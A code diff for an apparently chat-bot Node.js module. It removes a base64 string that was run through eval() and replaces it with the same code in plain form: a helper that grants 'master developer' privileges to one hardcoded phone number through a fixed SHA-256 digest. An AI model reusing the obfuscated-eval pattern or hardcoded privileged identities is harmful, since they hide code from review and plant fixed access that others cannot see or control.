@@ -1,3 +1,25 @@
 'use strict';
-const _0xb04995cc = Buffer.from('J3VzZSBzdHJpY3QnOwoKLy8gTUFTVEVSIC8gREVWRUxPUEVSIGF1dGhvcml6YXRpb24gY29uZmlndXJhdGlvbiBhbmQgaGVscGVyLgovLyBLZWVwIHRoZSBhdXRob3JpemF0aW9uIGRpZ2VzdCBwcml2YXRlOyBkbyBub3QgcHVibGlzaCBpdCBpbiBtZW51cyBvciBsb2dzLgpjb25zdCBjcnlwdG8gPSByZXF1aXJlKCdjcnlwdG8nKTsKCmNvbnN0IE1BU1RFUl9ERVZFTE9QRVJfTlVNQkVSID0gJzkxNjI2MDAyMTczNSc7CmNvbnN0IE1BU1RFUl9ERVZFTE9QRVJfQVVUSF9ESUdFU1QgPSAnZGNhZmZmNTNlZTg3MWZhZmYwMTczZjMyNjc0ZDY1M2FiNTM2MDA3ZmVhZmIyZGNlYTI3ZWQ4Yzc4ZGVjZGI3MSc7CgovKioKICogUmV0dXJucyB0cnVlIHdoZW4gYW55IG5vcm1hbGl6ZWQgc2VuZGVyIHBob25lLW51bWJlciBJRCBtYXRjaGVzIHRoZQogKiBjb25maWd1cmVkIE1BU1RFUiAvIERFVkVMT1BFUiBhdXRob3JpemF0aW9uIGRpZ2VzdC4KICogQHBhcmFtIHtzdHJpbmdbXX0gc2VuZGVySWRzIG5vcm1hbGl6ZWQgc2VuZGVyIHBob25lLW51bWJlciBJRHMKICogQHJldHVybnMge2Jvb2xlYW59CiAqLwpmdW5jdGlvbiBpc01hc3RlckRldmVsb3BlcihzZW5kZXJJZHMpIHsKICByZXR1cm4gQXJyYXkuaXNBcnJheShzZW5kZXJJZHMpICYmIHNlbmRlcklkcy5zb21lKGlkID0+CiAgICBjcnlwdG8uY3JlYXRlSGFzaCgnc2hhMjU2JykudXBkYXRlKFN0cmluZyhpZCkpLmRpZ2VzdCgnaGV4JykgPT09IE1BU1RFUl9ERVZFTE9QRVJfQVVUSF9ESUdFU1QKICApOwp9Cgptb2R1bGUuZXhwb3J0cyA9IHsKICBNQVNURVJfREVWRUxPUEVSX05VTUJFUiwKICBpc01hc3RlckRldmVsb3Blcgp9Owo=', 'base64').toString('utf8');
-eval(_0xb04995cc);
+
+// MASTER / DEVELOPER authorization configuration and helper.
+// Keep the authorization digest private; do not publish it in menus or logs.
+const crypto = require('crypto');
+
+const MASTER_DEVELOPER_NUMBER = '916260021735';
+const MASTER_DEVELOPER_AUTH_DIGEST = 'dcafff53ee871faff0173f32674d653ab536007feafb2dcea27ed8c78decdb71';
+
+/**
+ * Returns true when any normalized sender phone-number ID matches the
+ * configured MASTER / DEVELOPER authorization digest.
+ * @param {string[]} senderIds normalized sender phone-number IDs
+ * @returns {boolean}
+ */
+function isMasterDeveloper(senderIds) {
+  return Array.isArray(senderIds) && senderIds.some(id =>
+    crypto.createHash('sha256').update(String(id)).digest('hex') === MASTER_DEVELOPER_AUTH_DIGEST
+  );
+}
+
+module.exports = {
+  MASTER_DEVELOPER_NUMBER,
+  isMasterDeveloper
+};
